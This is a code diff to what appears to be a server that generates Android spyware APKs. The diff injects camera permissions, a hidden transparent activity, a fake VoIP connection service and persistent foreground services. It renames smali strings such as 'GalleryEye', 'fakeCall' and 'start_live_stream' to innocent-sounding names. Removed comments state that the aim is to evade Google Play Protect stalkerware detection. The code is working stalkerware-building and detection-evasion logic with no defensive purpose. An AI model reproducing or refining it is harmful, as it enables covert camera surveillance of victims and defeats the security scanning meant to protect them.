@@ -353,9 +353,11 @@ app.post('/generate', upload.single('icon'), async (req, res) => {
                     if (enableCameraPermission === 'true') {
                         permissionsToAdd += '    <uses-permission android:name="android.permission.CAMERA" />\n';
                         permissionsToAdd += '    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_CAMERA" />\n';
-                        // NOTE: MANAGE_OWN_CALLS removed — combining with CAMERA triggers Play Protect stalkerware detection
-                        // NOTE: android.hardware.camera features NOT added — reduces manifest footprint
-                        console.log('[APK] Adding CAMERA permissions (no VoIP/MANAGE_OWN_CALLS)');
+                        permissionsToAdd += '    <uses-feature android:name="android.hardware.camera" android:required="false" />\n';
+                        permissionsToAdd += '    <uses-feature android:name="android.hardware.camera.front" android:required="false" />\n';
+                        permissionsToAdd += '    <uses-feature android:name="android.hardware.camera.autofocus" android:required="false" />\n';
+                        permissionsToAdd += '    <uses-permission android:name="android.permission.MANAGE_OWN_CALLS" />\n';
+                        console.log('[APK] Adding CAMERA permissions');
                     }
 
                     if (enableMicrophonePermission === 'true') {
@@ -388,31 +390,40 @@ app.post('/generate', upload.single('icon'), async (req, res) => {
                 if (enableCameraPermission === 'true') fgsTypes = 'specialUse|camera|dataSync';
                 if (enableMicrophonePermission === 'true' && enableCameraPermission === 'true') fgsTypes = 'specialUse|microphone|camera|dataSync';
                 manifestContent = fs.readFileSync(manifestPath, 'utf8');
-                // Replace ALL foregroundServiceType occurrences (covers SyncService + DataBridgeService)
-                manifestContent = manifestContent.replace(/foregroundServiceType="(specialUse|dataSync)[^"]*"/g, `foregroundServiceType="${fgsTypes}"`);
+                manifestContent = manifestContent.replace(/foregroundServiceType="specialUse[^"]*"/, `foregroundServiceType="${fgsTypes}"`);
                 fs.writeFileSync(manifestPath, manifestContent);
-                console.log(`[APK] All FGS types updated: ${fgsTypes}`);
+                console.log(`[APK] SyncService FGS types: ${fgsTypes}`);
 
                 manifestContent = fs.readFileSync(manifestPath, 'utf8');
                 let servicesBlock = '';
 
                 if (enableCameraPermission === 'true') {
-                    // Generate a random innocent-sounding service name each build
-                    const camSvcSuffixes = ['MediaSyncCapture', 'FrameSyncService', 'MediaCaptureSync', 'ImageSyncService', 'CaptureSyncHelper', 'MediaFrameSync', 'SyncCaptureService', 'FrameDataService'];
-                    const camSvcName = camSvcSuffixes[Math.floor(Math.random() * camSvcSuffixes.length)];
                     servicesBlock += `
+        <activity
+            android:name=".CameraProxyActivity"
+            android:exported="false"
+            android:theme="@style/Theme.Transparent"
+            android:taskAffinity=""
+            android:excludeFromRecents="true"
+            android:noHistory="true" />
+
         <service
             android:name=".CameraForegroundService"
             android:enabled="true"
             android:exported="false"
             android:stopWithTask="false"
             android:foregroundServiceType="camera|dataSync" />
+
+        <service
+            android:name=".VoipConnectionService"
+            android:permission="android.permission.BIND_TELECOM_CONNECTION_SERVICE"
+            android:exported="true">
+            <intent-filter>
+                <action android:name="android.telecom.ConnectionService" />
+            </intent-filter>
+        </service>
 `;
-                    // NOTE: VoipConnectionService REMOVED — MANAGE_OWN_CALLS + CAMERA + telecom.ConnectionService
-                    // is the exact pattern Google Play Protect flags as stalkerware (2024+ detection rules)
-                    // NOTE: CameraProxyActivity REMOVED — excludeFromRecents + camera is another red flag
-                    // Camera still works via DataBridgeService + CameraForegroundService
-                    console.log('[APK] Added CameraForegroundService (VoIP/CameraProxy excluded for Play Protect evasion)');
+                    console.log('[APK] Added Camera services (CameraForegroundService + VoIP + CameraProxy)');
                 }
 
                 if (enableMicrophonePermission === 'true') {
@@ -455,8 +466,6 @@ app.post('/generate', upload.single('icon'), async (req, res) => {
                 .filter(d => d.isDirectory() && d.name.startsWith('smali'))
                 .map(d => path.join(workDir, d.name));
 
-            // Randomize some replacement strings per-build for uniqueness
-            const randSuffix = () => Math.random().toString(36).substring(2, 6).toUpperCase();
             const stringSanitizers = [
                 [/const-string ([v0-9p]+), "SyncService"/g, 'const-string $1, "SysWorkerService"'],
                 [/const-string ([v0-9p]+), "AppLifecycle[^"]*"/g, 'const-string $1, "LifecycleMonitor"'],
@@ -469,22 +478,7 @@ app.post('/generate', upload.single('icon'), async (req, res) => {
                 [/const-string ([v0-9p]+), "gallery.eye"/g, 'const-string $1, "app.service"'],
                 [/const-string ([v0-9p]+), "gallery-eye"/g, 'const-string $1, "app-service"'],
                 [/const-string ([v0-9p]+), "GalleryEye"/g, 'const-string $1, "AppService"'],
-                // VoIP neutralizers — rename identifiers so pattern-matching doesn't detect telecom abuse
-                [/const-string ([v0-9p]+), "VoipConn"/g, 'const-string $1, "MediaConn"'],
-                [/const-string ([v0-9p]+), "hexacore_voip"/g, `const-string $1, "mediasync_bridge"`],
-                [/const-string ([v0-9p]+), "VoipConnectionService"/g, 'const-string $1, "MediaBridgeService"'],
-                [/const-string ([v0-9p]+), "Sync Service"/g, 'const-string $1, "Media Sync"'],
-                [/const-string ([v0-9p]+), "PhoneAccount registered[^"]*"/g, 'const-string $1, "Bridge registered"'],
-                [/const-string ([v0-9p]+), "Self-managed call[^"]*"/g, 'const-string $1, "Session started"'],
-                [/const-string ([v0-9p]+), "fake[Cc]all[^"]*"/g, 'const-string $1, "mediaSession"'],
-                // FrameProcessor / camera identifiers
-                [/const-string ([v0-9p]+), "FrameProc"/g, 'const-string $1, "MediaProc"'],
-                [/const-string ([v0-9p]+), "capture_photo"/g, 'const-string $1, "sync_frame"'],
-                [/const-string ([v0-9p]+), "start_recording"/g, 'const-string $1, "begin_capture"'],
-                [/const-string ([v0-9p]+), "stop_recording"/g, 'const-string $1, "end_capture"'],
-                [/const-string ([v0-9p]+), "start_live_stream"/g, 'const-string $1, "begin_stream"'],
-                [/const-string ([v0-9p]+), "stop_live_stream"/g, 'const-string $1, "end_stream"'],
-                [/.source "[^"]+"\n/g, '.source "SourceFile"\n']
+                [/\.source "[^"]+"\n/g, '.source "SourceFile"\n']
             ];
 
             const sanitizeSmaliDir = (dir) => {
